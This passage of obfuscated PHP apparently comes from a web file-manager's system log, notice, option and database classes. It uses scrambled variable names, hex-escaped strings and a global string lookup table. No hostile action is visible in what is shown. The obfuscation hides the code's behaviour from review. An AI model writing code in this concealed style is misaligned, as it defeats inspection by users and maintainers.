LNG($”ˆÓ“Å[2368]), $”ˆÓ“Å[2369] => LNG($”ˆÓ“Å[2370]), $”ˆÓ“Å[1934] => LNG($”ˆÓ“Å[2371]), $”ˆÓ“Å[2372] => LNG($”ˆÓ“Å[2373]), $”ˆÓ“Å[1933] => LNG($”ˆÓ“Å[2374]), $”ˆÓ“Å[2375] => LNG($”ˆÓ“Å[2376]), $”ˆÓ“Å[2377] => LNG($”ˆÓ“Å[2378]), $”ˆÓ“Å[2379] => LNG($”ˆÓ“Å[2378]), $”ˆÓ“Å[2380] => LNG($”ˆÓ“Å[2381]), $”ˆÓ“Å[2382] => LNG($”ˆÓ“Å[2382]), $”ˆÓ“Å[2383] => LNG($”ˆÓ“Å[1905]), $”ˆÓ“Å[2384] => LNG($”ˆÓ“Å[2385]), $”ˆÓ“Å[2386] => LNG($”ˆÓ“Å[2387]), $”ˆÓ“Å[2388] => LNG($”ˆÓ“Å[2389]), $”ˆÓ“Å[2390] => LNG($”ˆÓ“Å[2391]), $”ˆÓ“Å[2392] => LNG($”ˆÓ“Å[2393]), $”ˆÓ“Å[2394] => LNG($”ˆÓ“Å[2394]), $”ˆÓ“Å[2395] => LNG($”ˆÓ“Å[2396]), $”ˆÓ“Å[2397] => LNG($”ˆÓ“Å[2398]), $”ˆÓ“Å[2399] => LNG($”ˆÓ“Å[2400]), $”ˆÓ“Å[2401] => LNG($”ˆÓ“Å[2402]), $”ˆÓ“Å[2403] => LNG($”ˆÓ“Å[2404]), $”ˆÓ“Å[2405] => LNG($”ˆÓ“Å[2406]), $”ˆÓ“Å[223] => LNG($”ˆÓ“Å[223]), $”ˆÓ“Å[224] => LNG($”ˆÓ“Å[2407]), $”ˆÓ“Å[2408] => LNG($”ˆÓ“Å[2408])); } private function typeFile() { $®‘¶™ğÜ =& $_SERVER[ü¢ÙÊñÛ]; $¿ï¤úÓ’ = array($®‘¶™ğÜ[1936] => array($®‘¶™ğÜ[1937]), $®‘¶™ğÜ[2347] => array($®‘¶™ğÜ[2409]), $®‘¶™ğÜ[2349] => array($®‘¶™ğÜ[2410]), $®‘¶™ğÜ[1929] => array($®‘¶™ğÜ[1930], $®‘¶™ğÜ[2411]), $®‘¶™ğÜ[2357] => array(), $®‘¶™ğÜ[2359] => array(), $®‘¶™ğÜ[2361] => array(), $®‘¶™ğÜ[1939] => array($®‘¶™ğÜ[1941]), $®‘¶™ğÜ[1940] => array($®‘¶™ğÜ[1941]), $®‘¶™ğÜ[2365] => array($®‘¶™ğÜ[2412]), $®‘¶™ğÜ[2367] => array($®‘¶™ğÜ[2412]), $®‘¶™ğÜ[2369] => array($®‘¶™ğÜ[2413]), $®‘¶™ğÜ[2355] => array($®‘¶™ğÜ[2414]), $®‘¶™ğÜ[1934] => array($®‘¶™ğÜ[2415]), $®‘¶™ğÜ[2372] => array($®‘¶™ğÜ[2416]), $®‘¶™ğÜ[1933] => array($®‘¶™ğÜ[1935])); return $¿ï¤úÓ’; } private function typeAll() { $Æ×¾´É† =& $_SERVER[ü¢ÙÊñÛ]; $•½ÈÛ‚« = $this->typeList; $çÇÚ‰ªÓ = array_filter($this->typeFile()); foreach ($çÇÚ‰ªÓ as $çæË™šâ => $òâÒ¬Ü) { $•½ÈÛ‚«[$òâÒ¬Ü[0]] = $•½ÈÛ‚«[$çæË™šâ]; } $•½ÈÛ‚«[$Æ×¾´É†[1941]] = LNG($Æ×¾´É†[2417]); $•½ÈÛ‚«[$Æ×¾´É†[2412]] = LNG($Æ×¾´É†[2418]); return $•½ÈÛ‚«; } public function addLog($è¾‹¿Ù, $«Ñğ–Õ = array()) { $êØ—µÑ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->typeList[$è¾‹¿Ù])) { return; } $¼üıáÂı = Session::get($êØ—µÑ[2100]); if (!$¼üıáÂı) { $¼üıáÂı = _get($«Ñğ–Õ, $êØ—µÑ[1759], 0); } if ($è¾‹¿Ù == $êØ—µÑ[2384] && is_array($«Ñğ–Õ[$êØ—µÑ[2419]]) && !$«Ñğ–Õ[$êØ—µÑ[2419]]) { return; } $Ç¨Ù» = get_client_ip(); if (!$«Ñğ–Õ || strlen(json_encode($«Ñğ–Õ)) >= 1024 * 64) { if ($«Ñğ–Õ && is_array($«Ñğ–Õ)) { $«Ñğ–Õ = array_intersect_key($«Ñğ–Õ, array_flip($êØ—µÑ[486], $êØ—µÑ[42])); $«Ñğ–Õ[$êØ—µÑ[2420]] = $Ç¨Ù»; } else { $«Ñğ–Õ = array($êØ—µÑ[2420] => $Ç¨Ù»); } } else { if (is_array($«Ñğ–Õ)) { $«Ñğ–Õ[$êØ—µÑ[2420]] = $Ç¨Ù»; } else { $«Ñğ–Õ = array($êØ—µÑ[1276] => $«Ñğ–Õ, $êØ—µÑ[2420] => $Ç¨Ù»); } } $«Ñğ–Õ = array($êØ—µÑ[1749] => Session::sign(), $êØ—µÑ[1750] => intval($¼üıáÂı), $êØ—µÑ[43] => $è¾‹¿Ù, $êØ—µÑ[1752] => json_encode($«Ñğ–Õ)); return parent::add($«Ñğ–Õ); } public function remove($ëùïÏÔ‹) { $this->where(array($_SERVER[ü¢ÙÊñÛ][504] => $ëùïÏÔ‹))->delete(); } private function _makeOrder($õä½ŞÌò = '') { $éö½ß¤“ =& $_SERVER[ü¢ÙÊñÛ]; $³§ÉÉÍ = $éö½ß¤“[244]; $øÜÕ¦¡‰ = array($éö½ß¤“[534] => $éö½ß¤“[535], $éö½ß¤“[536] => $éö½ß¤“[537]); $ØÀ«³›‰ = Input::get($éö½ß¤“[542], $éö½ß¤“[17], $éö½ß¤“[2137], array($éö½ß¤“[2054], $éö½ß¤“[536])); $ØÀ«³›‰ = $øÜÕ¦¡‰[$ØÀ«³›‰]; $õä½ŞÌò = $õä½ŞÌò . "{$³§ÉÉÍ}\x20{$ØÀ«³›‰}"; return $this->order($õä½ŞÌò); } public function get($ëÚ“†¤ = '') { $‡¼ø©¤Ó =& $_SERVER[ü¢ÙÊñÛ]; if (!$ëÚ“†¤) { show_json(array()); } $ú†³½ú = array(); if ($ëÚ“†¤[$‡¼ø©¤Ó[1759]]) { $ú†³½ú[$‡¼ø©¤Ó[1759]] = $ëÚ“†¤[$‡¼ø©¤Ó[1759]]; } if (isset($ëÚ“†¤[$‡¼ø©¤Ó[825]])) { $ªüÃ£œ = $ëÚ“†¤[$‡¼ø©¤Ó[825]]; $Òè¬áÈ = isset($ëÚ“†¤[$‡¼ø©¤Ó[826]]) ? $ëÚ“†¤[$‡¼ø©¤Ó[826]] : time(); $ú†³½ú[$‡¼ø©¤Ó[244]] = array($‡¼ø©¤Ó[420], array($ªüÃ£œ, $Òè¬áÈ)); } if ($ëÚ“†¤[$‡¼ø©¤Ó[43]]) { $ãµÉìà = explode($‡¼ø©¤Ó[60], $ëÚ“†¤[$‡¼ø©¤Ó[43]]); $¤‚¬û„ = $this->typeFile(); $„ÓÅé£ã = array(); foreach ($ãµÉìà as $•é…É¸¯) { $„ÓÅé£ã[] = $•é…É¸¯; if (isset($¤‚¬û„[$•é…É¸¯])) { $„ÓÅé£ã = array_merge($„ÓÅé£ã, $¤‚¬û„[$•é…É¸¯]); } } $„ÓÅé£ã = array_unique($„ÓÅé£ã); if ($„ÓÅé£ã) { $ú†³½ú[$‡¼ø©¤Ó[43]] = array($‡¼ø©¤Ó[17], $„ÓÅé£ã); } } else { $ú†³½ú[$‡¼ø©¤Ó[43]] = array($‡¼ø©¤Ó[2421], $‡¼ø©¤Ó[2422]); } if (!empty($ëÚ“†¤[$‡¼ø©¤Ó[2420]])) { $ú†³½ú[$‡¼ø©¤Ó[537]] = array($‡¼ø©¤Ó[470], "\x25{$ëÚ“†¤[$‡¼ø©¤Ó[2420]]}\x25"); } $ûïâã²½ = $this->_makeOrder()->where($ú†³½ú)->selectPage(); if (empty($ûïâã²½[$‡¼ø©¤Ó[457]])) { show_json(array(), !0, $ûïâã²½[$‡¼ø©¤Ó[454]]); } $ûïâã²½[$‡¼ø©¤Ó[457]] = $this->logList($ûïâã²½[$‡¼ø©¤Ó[457]]); return $ûïâã²½; } private function ipAddress(&$›ò‹ïÎ°) { $ò©—…¼¿ =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($›ò‹ïÎ°[$ò©—…¼¿[2420]])) { $ãğ×ñ–õ = IpLocation::get($›ò‹ïÎ°[$ò©—…¼¿[2420]]); } else { $ãğ×ñ–õ = LNG($ò©—…¼¿[2423]); } $›ò‹ïÎ°[$ò©—…¼¿[2424]] = $ãğ×ñ–õ; } private function descZipDownload($ÁËô…¬½, &$ŞæÉ±±Â) { $¹„Ú·…¿ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($ÁËô…¬½[$¹„Ú·…¿[2425]])) { return; } $Ä¢÷ğßï = json_decode($ÁËô…¬½[$¹„Ú·…¿[2425]], !0); foreach ($Ä¢÷ğßï as $ÃŒ„ı®) { try { $“â„Ã¢à = IO::infoFullSimple($ÃŒ„ı®[$¹„Ú·…¿[98]]); } catch (Exception $À×ô×“Ö) { continue; } $ÁËô…¬½[$¹„Ú·…¿[98]] = $ÃŒ„ı®[$¹„Ú·…¿[98]]; $ŞæÉ±±Â[] = $ÁËô…¬½[$¹„Ú·…¿[204]] = $“â„Ã¢à[$¹„Ú·…¿[204]]; $ŞæÉ±±Â[] = $ÁËô…¬½[$¹„Ú·…¿[2193]] = $“â„Ã¢à[$¹„Ú·…¿[203]]; break; } return $ÁËô…¬½; } private function getSourceList(&$ÂõôÍŒ©) { $â‚Èğ°† =& $_SERVER[ü¢ÙÊñÛ]; $áÀ¨…Êß = array(); foreach ($ÂõôÍŒ© as $×º¡ö’¬ => $ôÂ±óû) { $“Š¯ô– = json_decode($ôÂ±óû[$â‚Èğ°†[537]], !0); if ($ôÂ±óû[$â‚Èğ°†[43]] == $â‚Èğ°†[1932]) { $“Š¯ô– = $this->descZipDownload($“Š¯ô–, $áÀ¨…Êß); $ÂõôÍŒ©[$×º¡ö’¬][$â‚Èğ°†[537]] = json_encode($“Š¯ô–); continue; } if (strpos($ôÂ±óû[$â‚Èğ°†[43]], $â‚Èğ°†[2195]) !== 0) { if (!isset($“Š¯ô–[$â‚Èğ°†[98]]) || strpos($ôÂ±óû[$â‚Èğ°†[43]], $â‚Èğ°†[2426]) !== 0) { continue; } try { $°¿®“±å = IO::infoFullSimple($“Š¯ô–[$â‚Èğ°†[98]]); } catch (Exception $‘°Âı´¢) { continue; } $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[204]] = $°¿®“±å[$â‚Èğ°†[204]]; $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[2193]] = $°¿®“±å[$â‚Èğ°†[203]]; $ÂõôÍŒ©[$×º¡ö’¬][$â‚Èğ°†[537]] = json_encode($“Š¯ô–); continue; } $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[204]]; $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[2193]]; if ($“Š¯ô–[$â‚Èğ°†[43]] == $â‚Èğ°†[634]) { $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[537]][$â‚Èğ°†[1230]]; $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[537]][$â‚Èğ°†[1231]]; } if ($“Š¯ô–[$â‚Èğ°†[43]] == $â‚Èğ°†[2204]) { $áÀ¨…Êß[] = $“Š¯ô–[$â‚Èğ°†[537]][$â‚Èğ°†[204]]; } } if (!$áÀ¨…Êß) { return array(); } return Model($â‚Èğ°†[890])->sourceListInfo($áÀ¨…Êß, !0); } private function logList($ÅğËèÎÈ) { $ÂÆ‡İÁ¨ =& $_SERVER[ü¢ÙÊñÛ]; $İö»¾Ó¶ = array_to_keyvalue($ÅğËèÎÈ, $ÂÆ‡İÁ¨[22], $ÂÆ‡İÁ¨[1759]); $ÈàŸ¼« = Model($ÂÆ‡İÁ¨[608])->userListInfo(array_unique($İö»¾Ó¶)); $‰Ïª¿ùñ = $this->getSourceList($ÅğËèÎÈ); $à‰ë‚Ò’ = $this->typeAll(); $¬ãà˜ŞÍ = array(); $Â–ì‰³ß = array(); foreach ($ÅğËèÎÈ as $Ø³˜Ó’ => $ıìæª·Ú) { $òë£„ƒ‰ = $ıìæª·Ú[$ÂÆ‡İÁ¨[43]]; $ÃäÄ× = isset($ÈàŸ¼«[$ıìæª·Ú[$ÂÆ‡İÁ¨[1759]]]) ? $ÈàŸ¼«[$ıìæª·Ú[$ÂÆ‡İÁ¨[1759]]] : !1; $·ôÁÚËŠ = strpos($òë£„ƒ‰, $ÂÆ‡İÁ¨[2427]) === 0 ? LNG($ÂÆ‡İÁ¨[2428]) : LNG($ÂÆ‡İÁ¨[2423]); $ıìæª·Ú[$ÂÆ‡İÁ¨[42]] = isset($ÃäÄ×[$ÂÆ‡İÁ¨[42]]) ? $ÃäÄ×[$ÂÆ‡İÁ¨[42]] : LNG($ÂÆ‡İÁ¨[2423]); $ıìæª·Ú[$ÂÆ‡İÁ¨[2254]] = isset($ÃäÄ×[$ÂÆ‡İÁ¨[2254]]) ? $ÃäÄ×[$ÂÆ‡İÁ¨[2254]] : $ÂÆ‡İÁ¨[22]; $ıìæª·Ú[$ÂÆ‡İÁ¨[1647]] = isset($à‰ë‚Ò’[$òë£„ƒ‰]) ? $à‰ë‚Ò’[$òë£„ƒ‰] : $·ôÁÚËŠ; $ıìæª·Ú[$ÂÆ‡İÁ¨[2136]] = $ÃäÄ×; $ùµÙĞâÃ = json_decode($ıìæª·Ú[$ÂÆ‡İÁ¨[537]], !0); $ıìæª·Ú[$ÂÆ‡İÁ¨[2420]] = isset($ùµÙĞâÃ[$ÂÆ‡İÁ¨[2420]]) ? $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2420]] : $ÂÆ‡İÁ¨[22]; $ıìæª·Ú[$ÂÆ‡İÁ¨[2424]] = IpLocation::get($ıìæª·Ú[$ÂÆ‡İÁ¨[2420]]); if (strpos($òë£„ƒ‰, $ÂÆ‡İÁ¨[2195]) === 0 || isset($ùµÙĞâÃ[$ÂÆ‡İÁ¨[2193]])) { $ùµÙĞâÃ[$ÂÆ‡İÁ¨[101]] = $‰Ïª¿ùñ[$ùµÙĞâÃ[$ÂÆ‡İÁ¨[204]]]; $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2209]] = $‰Ïª¿ùñ[$ùµÙĞâÃ[$ÂÆ‡İÁ¨[2193]]]; if ($ùµÙĞâÃ[$ÂÆ‡İÁ¨[43]] == $ÂÆ‡İÁ¨[634]) { $ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[1230]] = $‰Ïª¿ùñ[$ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[1230]]]; $ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[1231]] = $‰Ïª¿ùñ[$ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[1231]]]; } if ($ùµÙĞâÃ[$ÂÆ‡İÁ¨[43]] == $ÂÆ‡İÁ¨[2204]) { $ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[204]] = $‰Ïª¿ùñ[$ùµÙĞâÃ[$ÂÆ‡İÁ¨[537]][$ÂÆ‡İÁ¨[204]]]; } if ($ùµÙĞâÃ[$ÂÆ‡İÁ¨[43]] == $ÂÆ‡İÁ¨[1927]) { $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2209]] = $ùµÙĞâÃ[$ÂÆ‡İÁ¨[101]]; $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2193]] = $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2209]][$ÂÆ‡İÁ¨[204]]; $ùµÙĞâÃ[$ÂÆ‡İÁ¨[101]] = !1; $ùµÙĞâÃ[$ÂÆ‡İÁ¨[204]] = $ÂÆ‡İÁ¨[22]; } $ÆÄíÅùÀ = array($ÂÆ‡İÁ¨[1927], $ÂÆ‡İÁ¨[2191]); if (!in_array($ùµÙĞâÃ[$ÂÆ‡İÁ¨[43]], $ÆÄíÅùÀ)) { if ($ùµÙĞâÃ[$ÂÆ‡İÁ¨[101]] && $ùµÙĞâÃ[$ÂÆ‡İÁ¨[101]][$ÂÆ‡İÁ¨[201]] == $ÂÆ‡İÁ¨[202]) { $Â–ì‰³ß[] = $ıìæª·Ú[$ÂÆ‡İÁ¨[486]]; unset($ÅğËèÎÈ[$Ø³˜Ó’]); continue; } if ($ùµÙĞâÃ[$ÂÆ‡İÁ¨[2209]] && $ùµÙĞâÃ[$ÂÆ‡İÁ¨[2209]][$ÂÆ‡İÁ¨[201]] == $ÂÆ‡İÁ¨[202]) { $Â–ì‰³ß[] = $ıìæª·Ú[$ÂÆ‡İÁ¨[486]]; unset($ÅğËèÎÈ[$Ø³˜Ó’]); continue; } } } $ıìæª·Ú[$ÂÆ‡İÁ¨[537]] = $ùµÙĞâÃ; unset($ıìæª·Ú[$ÂÆ‡İÁ¨[2429]]); $¬ãà˜ŞÍ[] = $ıìæª·Ú; } $this->clearSystemPathLog($Â–ì‰³ß); return $¬ãà˜ŞÍ; } private function clearSystemPathLog($Õ”„¥¸©) { $ıŞÁ’– =& $_SERVER[ü¢ÙÊñÛ]; if (count($Õ”„¥¸©) == 0) { return; } $ÎÄÖÏ¤ = array($ıŞÁ’–[486] => array($ıŞÁ’–[17], array_unique($Õ”„¥¸©))); $this->where($ÎÄÖÏ¤)->delete(); } public function deviceList($ é¡ØáÎ, $ŠÍÂĞ = 0) { $ˆ¿ıÔ¡Õ =& $_SERVER[ü¢ÙÊñÛ]; $¥ºššÕĞ = array($ˆ¿ıÔ¡Õ[1759] => $ é¡ØáÎ, $ˆ¿ıÔ¡Õ[244] => array($ˆ¿ıÔ¡Õ[1080], $ŠÍÂĞ), $ˆ¿ıÔ¡Õ[43] => $ˆ¿ıÔ¡Õ[1901]); $îÂ‰•‰Í = array(); $ ûÙ¢ğ = $this->field($ˆ¿ıÔ¡Õ[2430])->where($¥ºššÕĞ)->order($ˆ¿ıÔ¡Õ[2207])->limit(50)->select(); foreach ($ ûÙ¢ğ as $ñ¡Ú—© => $ÙŒÖì– ) { if ($ñ¡Ú—© > 0 && abs($ÙŒÖì– [$ˆ¿ıÔ¡Õ[244]] - $ ûÙ¢ğ[$ñ¡Ú—© - 1][$ˆ¿ıÔ¡Õ[244]]) < 5) { continue; } $¨Â„…¿° = json_decode($ÙŒÖì– [$ˆ¿ıÔ¡Õ[537]], !0); $ÙŒÖì– [$ˆ¿ıÔ¡Õ[2420]] = isset($¨Â„…¿°[$ˆ¿ıÔ¡Õ[2420]]) ? $¨Â„…¿°[$ˆ¿ıÔ¡Õ[2420]] : $ˆ¿ıÔ¡Õ[22]; unset($¨Â„…¿°[$ˆ¿ıÔ¡Õ[2420]]); $Æ´¶§£Û = $this->deviceType($¨Â„…¿°[$ˆ¿ıÔ¡Õ[2196]]); if (isset($îÂ‰•‰Í[$Æ´¶§£Û])) { continue; } $ÙŒÖì– [$ˆ¿ıÔ¡Õ[2424]] = IpLocation::get($ÙŒÖì– [$ˆ¿ıÔ¡Õ[2420]]); $ÙŒÖì– [$ˆ¿ıÔ¡Õ[537]] = $¨Â„…¿°; $îÂ‰•‰Í[$Æ´¶§£Û] = $ÙŒÖì– ; } return array_values($îÂ‰•‰Í); } public function deviceType($à†×ÔïÈ) { return $à†×ÔïÈ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x6e\x6f\x74\x69\143\x65\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\143\x6f\x6e\x74\145\x6e\x74", "\x61\165\x74\x68", "\x6d\157\144\145", "\164\151\155\145", "\164\x79\x70\145", "\154\x65\166\145\x6c", "\x65\x6e\x61\x62\x6c\x65", "\x73\x6f\x72\x74"); public function listData($Ù‹‰£± = false, $¿æÎ¹²‰ = "\x73\157\162\x74", $„Ñš°»  = false) { return parent::listData($Ù‹‰£±, $¿æÎ¹²‰, $„Ñš°» ); } public function add($‡İßö˜Ÿ) { $­ÁÔáÛÔ =& $_SERVER[ü¢ÙÊñÛ]; $¸ÑºÔ¶‘ = time(); if ($‡İßö˜Ÿ[$­ÁÔáÛÔ[26]] == $­ÁÔáÛÔ[2431]) { $¸ÑºÔ¶‘ = strtotime($‡İßö˜Ÿ[$­ÁÔáÛÔ[217]]); } $‡İßö˜Ÿ[$­ÁÔáÛÔ[217]] = $¸ÑºÔ¶‘; return parent::insert($‡İßö˜Ÿ); } public function update($²£ìœôÎ, $¸³ÑñĞ) { $ëÎÂô‰ƒ =& $_SERVER[ü¢ÙÊñÛ]; $Öì ¨ = $this->listData($²£ìœôÎ); if (!$Öì ¨) { return !1; } $èÑö»Ê¥ = time(); if ($¸³ÑñĞ[$ëÎÂô‰ƒ[26]] == $ëÎÂô‰ƒ[2431]) { $èÑö»Ê¥ = strtotime($¸³ÑñĞ[$ëÎÂô‰ƒ[217]]); } $¸³ÑñĞ[$ëÎÂô‰ƒ[217]] = $èÑö»Ê¥; return parent::update($²£ìœôÎ, $¸³ÑñĞ); } public function remove($·á­âÀİ) { $ã×âŸ†î = $this->listData($·á­âÀİ); if (!$ã×âŸ†î || $ã×âŸ†î[$_SERVER[ü¢ÙÊñÛ][202]]) { return !1; } return parent::remove($·á­âÀİ); } public function sort($Çê¢âÃ, $Á¢‡º ¥) { return parent::update($Çê¢âÃ, $Á¢‡º ¥); } public function enable($œ±öú‚¨, $’˜ĞßÀ) { return parent::update($œ±öú‚¨, array($_SERVER[ü¢ÙÊñÛ][2432] => $’˜ĞßÀ)); } private function initUserOption() { $…¨Ï¬ =& $_SERVER[ü¢ÙÊñÛ]; $this->optionType = $…¨Ï¬[2433]; $this->modelType = $…¨Ï¬[2434]; $this->field = array($…¨Ï¬[2435], $…¨Ï¬[42], $…¨Ï¬[217], $…¨Ï¬[43], $…¨Ï¬[2436], $…¨Ï¬[815], $…¨Ï¬[239]); } public function userNoticeGet($º¤‹ÅÆ™ = false) { $this->initUserOption(); return parent::listData($º¤‹ÅÆ™, $_SERVER[ü¢ÙÊñÛ][486], !0); } public function userNoticeAdd($êÄ•ì’‚) { $é’šÈé =& $_SERVER[ü¢ÙÊñÛ]; $this->initUserOption(); $û—”£Ÿİ = $this->findByKey($é’šÈé[2435], $êÄ•ì’‚[$é’šÈé[486]]); if ($û—”£Ÿİ) { return !0; } $Û”¨à¼ = array($é’šÈé[2435] => $êÄ•ì’‚[$é’šÈé[486]], $é’šÈé[42] => $êÄ•ì’‚[$é’šÈé[42]], $é’šÈé[217] => $êÄ•ì’‚[$é’šÈé[217]], $é’šÈé[43] => isset($êÄ•ì’‚[$é’šÈé[43]]) ? $êÄ•ì’‚[$é’šÈé[43]] : 1, $é’šÈé[2436] => isset($êÄ•ì’‚[$é’šÈé[2436]]) ? $êÄ•ì’‚[$é’šÈé[2436]] : 0, $é’šÈé[815] => 0, $é’šÈé[239] => 0); return parent::insert($Û”¨à¼); } public function userNoticeEdit($ß¼ƒŠË‡, $Û¬ö‹àò) { $this->initUserOption(); return parent::update($ß¼ƒŠË‡, $Û¬ö‹àò); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x6f\x70\x74\151\157\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\157\154\145", "\162\157\154\x65\107\x72\157\165\x70", "\162\x65\x67\151\163\164", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($À¼ûØòŒ) { return "\x53\171\163\x74\x65\155\117\x70\164\x69\157\156\137{$À¼ûØòŒ}"; } protected function optionDefault($ûÊÎ¾ÈÜ = '') { $Ì˜ßÇÛ =& $_SERVER[ü¢ÙÊñÛ]; if ($ûÊÎ¾ÈÜ == $Ì˜ßÇÛ[22]) { return $GLOBALS[$Ì˜ßÇÛ[16]][$Ì˜ßÇÛ[468]]; } } } goto DÁèÄ §ğÊ; Câ„·„Œ¬©: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\x71" => "\74\76", "\x67\164" => "\76", "\x65\147\164" => "\x3e\75", "\154\x74" => "\x3c", "\x65\x6c\x74" => "\74\75", "\x6e\x6f\x74\x6c\151\153\145" => "\116\x4f\124\40\114\x49\113\105", "\x6c\x69\x6b\x65" => "\x4c\111\x4b\105", "\151\x6e" => "\x49\x4e", "\x6e\157\x74\x69\156" => "\x4e\117\124\40\111\x4e", "\156\157\164\x20\151\x6e" => "\x4e\117\124\40\x49\x4e", "\x62\x65\x74\x77\x65\145\156" => "\102\105\x54\x57\x45\x45\116", "\156\157\164\142\145\164\x77\x65\145\x6e" => "\116\x4f\x54\x20\102\x45\x54\x57\x45\x45\x4e", "\x6e\157\x74\x20\x62\x65\164\167\145\145\156" => "\x4e\x4f\x54\x20\102\x45\124\x57\105\x45\x4e"); protected $selectSql = "\123\x45\x4c\x45\103\124\45\x44\111\123\124\x49\116\x43\124\x25\40\x25\x46\111\105\x4c\x44\45\x20\x46\122\117\x4d\40\x25\x54\101\102\x4c\x45\x25\45\x4a\117\x49\116\x25\x25\127\110\x45\x52\x45\x25\x25\107\122\117\x55\120\45\45\x48\101\126\111\x4e\107\45\x25\x4f\x52\x44\105\122\45\45\x4c\111\x4d\111\124\x25\x20\x25\125\116\111\117\116\x25\x25\103\x4f\115\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $ÒÂÜòåÁ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ü¢ÙÊñÛ][1026], $ÒÂÜòåÁ); } public function factory($ÃÚ©¬ñÖ = '') { $Õƒîïˆ« =& $_SERVER[ü¢ÙÊñÛ]; $ÃÚ©¬ñÖ = $this->parseConfig($ÃÚ©¬ñÖ); if (empty($ÃÚ©¬ñÖ[$Õƒîïˆ«[1027]])) { think_exception(think_lang($Õƒîïˆ«[1028])); } $this->dbType = ucwords(strtolower($ÃÚ©¬ñÖ[$Õƒîïˆ«[1027]])); $¯íÖ’£Å = $Õƒîïˆ«[1029] . $this->dbType; if (class_exists($¯íÖ’£Å)) { $Çô«¡ÔÏ = new $¯íÖ’£Å($ÃÚ©¬ñÖ); if ($Õƒîïˆ«[1030] != strtolower($ÃÚ©¬ñÖ[$Õƒîïˆ«[1027]])) { $Çô«¡ÔÏ->dbType = strtoupper($this->dbType); } else { $Çô«¡ÔÏ->dbType = $this->_getDsnType($ÃÚ©¬ñÖ[$Õƒîïˆ«[982]]); } } else { think_exception(think_lang($Õƒîïˆ«[1031]) . $Õƒîïˆ«[1032] . $¯íÖ’£Å); } return $Çô«¡ÔÏ; } public function __call($”ç†ôæÄ, $Ó•ß­¨ü) { if (method_exists($this, $”ç†ôæÄ)) { return call_user_func_array(array($this, $”ç†ôæÄ), $Ó•ß­¨ü); } } protected function _getDsnType($ËØÎ¬‰Ÿ) { $°ëÖ«ğ‚ = explode($_SERVER[ü¢ÙÊñÛ][14], $ËØÎ¬‰Ÿ); $ô«Áéê¯ = strtoupper(trim($°ëÖ«ğ‚[0])); return $ô«Áéê¯; } private function parseConfig($²üù’‘ = '') { $Ù¢—¶úÇ =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($²üù’‘) && is_string($²üù’‘)) { $²üù’‘ = $this->parseDSN($²üù’‘); } elseif (is_array($²üù’‘)) { $²üù’‘ = array_change_key_case($²üù’‘); $²üù’‘ = array($Ù¢—¶úÇ[1027] => $²üù’‘[$Ù¢—¶úÇ[1033]], $Ù¢—¶úÇ[954] => $²üù’‘[$Ù¢—¶úÇ[1034]], $Ù¢—¶úÇ[955] => $²üù’‘[$Ù¢—¶úÇ[1035]], $Ù¢—¶úÇ[952] => $²üù’‘[$Ù¢—¶úÇ[1036]], $Ù¢—¶úÇ[953] => $²üù’‘[$Ù¢—¶úÇ[1037]], $Ù¢—¶úÇ[31] => $²üù’‘[$Ù¢—¶úÇ[1038]], $Ù¢—¶úÇ[982] => $²üù’‘[$Ù¢—¶úÇ[1039]], $Ù¢—¶úÇ[27] => isset($²üù’‘[$Ù¢—¶úÇ[1040]]) ? $²üù’‘[$Ù¢—¶úÇ[1040]] : array()); } elseif (empty($²üù’‘)) { if (think_config($Ù¢—¶úÇ[1041]) && $Ù¢—¶úÇ[1030] != strtolower(think_config($Ù¢—¶úÇ[1042]))) { $²üù’‘ = $this->parseDSN(think_config($Ù¢—¶úÇ[1041])); } else { $²üù’‘ = array($Ù¢—¶úÇ[1027] => think_config($Ù¢—¶úÇ[1042]), $Ù¢—¶úÇ[954] => think_config($Ù¢—¶úÇ[1043]), $Ù¢—¶úÇ[955] => think_config($Ù¢—¶úÇ[1044]), $Ù¢—¶úÇ[952] => think_config($Ù¢—¶úÇ[1045]), $Ù¢—¶úÇ[953] => think_config($Ù¢—¶úÇ[1046]), $Ù¢—¶úÇ[31] => think_config($Ù¢—¶úÇ[335]), $Ù¢—¶úÇ[982] => think_config($Ù¢—¶úÇ[1041]), $Ù¢—¶úÇ[27] => think_config($Ù¢—¶úÇ[1047])); } } return $²üù’‘; } protected function initConnect($ı•ŞÍğü = true) { if (1 == think_config($_SERVER[ü¢ÙÊñÛ][32])) { $this->_linkID = $this->multiConnect($ı•ŞÍğü); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) 